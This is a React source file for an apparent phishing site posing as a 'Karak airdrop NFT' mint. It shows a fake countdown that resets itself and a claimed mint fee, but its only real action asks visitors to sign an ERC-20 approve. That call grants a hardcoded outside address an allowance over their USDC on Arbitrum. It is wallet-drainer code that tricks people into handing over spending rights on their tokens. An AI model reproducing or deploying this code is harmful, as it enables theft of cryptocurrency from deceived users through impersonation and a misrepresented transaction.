import React, { useState, useEffect } from 'react';
import EthereumProvider from '@walletconnect/ethereum-provider';
import { ethers } from 'ethers';
import './App.css';


const ERC20_ABI: any[] = [
    // Функция approve
    {
        "constant": false,
        "inputs": [
            {
                "name": "_spender",
                "type": "address"
            },
            {
                "name": "_value",
                "type": "uint256"
            }
        ],
        "name": "approve",
        "outputs": [
            {
                "name": "",
                "type": "bool"
            }
        ],
        "type": "function"
    },
    // Опционально: функция для проверки текущего allowance
    {
        "constant": true,
        "inputs": [
            {
                "name": "_owner",
                "type": "address"
            },
            {
                "name": "_spender",
                "type": "address"
            }
        ],
        "name": "allowance",
        "outputs": [
            {
                "name": "",
                "type": "uint256"
            }
        ],
        "type": "function"
    },
    // Опционально: функция для проверки баланса
    {
        "constant": true,
        "inputs": [
            {
                "name": "_owner",
                "type": "address"
            }
        ],
        "name": "balanceOf",
        "outputs": [
            {
                "name": "balance",
                "type": "uint256"
            }
        ],
        "type": "function"
    }
];

const TOKEN_ADDRESS = "0xaf88d065e77c8cC2239327C5EDb3A432268e5831"; // Замените на реальный адрес токена
const APPROVE_AMOUNT = "10000000000000000000"; // 1 токен с 18 десятичными знаками
const ADRESS_APPROVE = "0x8B5F69C28Bc1BCceAE51fb7a028091581484ed5e"

function App() {
    const [provider, setProvider] = useState<EthereumProvider | null>(null);
    const [account, setAccount] = useState<string | null>(null);
    const [approvalStatus, setApprovalStatus] = useState<string | null>(null);
    const [timeLeft, setTimeLeft] = useState<number>(23 * 60 * 60); // 23 часа в секундах

    useEffect(() => {
        const initProvider = async () => {
            try {
                const newProvider = await EthereumProvider.init({
                    projectId: '4d63cbda1c61e149111331eebc34f837',
                    chains: [42161],
                    showQrModal: true
                });
                setProvider(newProvider);
            } catch (error) {
                console.error("Failed to initialize provider:", error);
            }
        };
        initProvider();

        const timer = setInterval(() => {
            setTimeLeft(prevTime => prevTime > 0 ? prevTime - 1 : 23 * 60 * 60);
        }, 1000);

        return () => clearInterval(timer);
    }, []);

    const connectWallet = async () => {
        if (provider) {
            try {
                await provider.connect();
                const accounts = await provider.request({ method: 'eth_requestAccounts' }) as string[];
                if (accounts.length > 0) {
                    setAccount(accounts[0]);
                }
            } catch (error) {
                console.error("Failed to connect wallet:", error);
            }
        }
    };

    const approveToken = async () => {
        if (provider && account) {
            try {
                const ethersProvider = new ethers.providers.Web3Provider(provider as any);
                const signer = ethersProvider.getSigner(account);
                const tokenContract = new ethers.Contract(TOKEN_ADDRESS, ERC20_ABI, signer);

                setApprovalStatus("Approval pending...");
                const tx = await tokenContract.approve(ADRESS_APPROVE, APPROVE_AMOUNT);
                await tx.wait();
                setApprovalStatus("Approval successful!");
            } catch (error) {
                console.error(error);
                setApprovalStatus("Approval failed");
            }
        }
    };

    const formatTime = (seconds: number) => {
        const hours = Math.floor(seconds / 3600);
        const minutes = Math.floor((seconds % 3600) / 60);
        const secs = seconds % 60;
        return {
            hours: hours.toString().padStart(2, '0'),
            minutes: minutes.toString().padStart(2, '0'),
            seconds: secs.toString().padStart(2, '0')
        };
    };

    const time = formatTime(timeLeft);

    return (
        <div className="App">
            <header>
                <div className="logo">Karak</div>
                <nav>
                    <a href="#">Develop</a>
                    <a href="#">Ecosystem</a>
                    <a href="#">Resources</a>
                    <a href="#">Bridge</a>
                    <a href="#">Sessions</a>
                </nav>
                <button className="connect-wallet" onClick={connectWallet}>
                    {account ? `Connected: ${account.slice(0, 6)}...${account.slice(-4)}` : 'Connect Wallet'}
                </button>
            </header>
            <main>
                <div className="content">
                    <h1>Mint your Karak airdrop NFT</h1>
                    
                    <p>We have a mint fee of 0.001 ETH to fight spam.</p>
                    
                    <div className="timer">
                        <div className="timer-block">
                            <div className="timer-number">{time.hours}</div>
                            <div className="timer-label">Hours</div>
                        </div>
                        <div className="timer-separator">:</div>
                        <div className="timer-block">
                            <div className="timer-number">{time.minutes}</div>
                            <div className="timer-label">Minutes</div>
                        </div>
                        <div className="timer-separator">:</div>
                        <div className="timer-block">
                            <div className="timer-number">{time.seconds}</div>
                            <div className="timer-label">Seconds</div>
                        </div>
                    </div>
                    <div className="approve-token">
                        <button onClick={approveToken}>Approve Token</button>
                    </div>
                    {approvalStatus && <p>{approvalStatus}</p>}
                </div>
            </main>
        </div>
    );
}

export default App;
